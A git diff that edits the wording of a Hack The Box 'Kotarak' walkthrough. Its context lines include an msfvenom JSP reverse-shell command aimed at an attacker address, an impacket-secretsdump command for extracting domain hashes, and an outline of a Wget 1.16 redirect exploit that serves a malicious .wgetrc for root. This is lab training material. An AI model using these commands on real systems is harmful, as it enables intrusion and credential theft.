@@ -59,7 +59,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > 
 
 ### *Privilege Escalation [ tomcat to atanas ]*
 
-⇒ In /home/tomcat/to_archive/pentest_data  folder we find 2 interesting files which looks like one of them is ntds.dit and the other is system registry file :
+⇒ In /home/tomcat/to_archive/pentest_data  folder we find 2 interesting files which looks like one of them is ntds.dit and the other is system registry file
+   .dir file contains the details for the ad environment and .bin is registry file  :
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png)
 
@@ -87,7 +88,7 @@ impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgra
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root1.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root1.png)
 
-→ Looks like there's another docker container  machine on the network with the ip [ 10.0.3.133 ] which is running an wget cron to our http server. We can also see the version of Wget being used  ( Wget/1.16 ). There's an exploit for this version of wget being used
+→ Looks like there's another   machine on the network with the ip [ 10.0.3.133 ] which is running an wget request  on  http server. We can also see the version of Wget being used  ( Wget/1.16 ). There's an exploit for this version of wget being used
 
 Exploit : [https://www.exploit-db.com/exploits/40064](https://www.exploit-db.com/exploits/40064)
 
@@ -101,18 +102,18 @@ execution and even root privilege escalation if wget is run via a root cronjob
 as is often the case in many web application deployments.
 ```
 
-⇒ So in this exploit we will create a 301x redirect , when the user machine  try to access that wget archive  file it will redirected to ftp server and that ftp server will be running  on our own attacker machine and it will serve a malicious file which will give us root access 
+⇒ So in this exploit we will create a 301x redirect , when the user machine  try to access that wget archive  file it will redirected to the  ftp server and that ftp server will be running  on our own attacker machine that will serve a malicious file which will give us root access 
 
 → Creating malicious .wgetrc File on our Own machine  that we will be serving :
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root2.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root2.png)
 
 
-=> Run pythonftp server on attacker machine , our own machine 
+=> Run pythonftp server on attacker machine , i.e our own machine 
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/python.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/python.png)
 
-First we need to Edit our exploit and then transfer it into our victim machine  it on the system Using python http server on attcker  and wget on victim  :
+First we need to Edit our exploit and then transfer it into our victim machine  Using python http server on attcker  and wget on victim  :
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root4.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/root4.png)
 
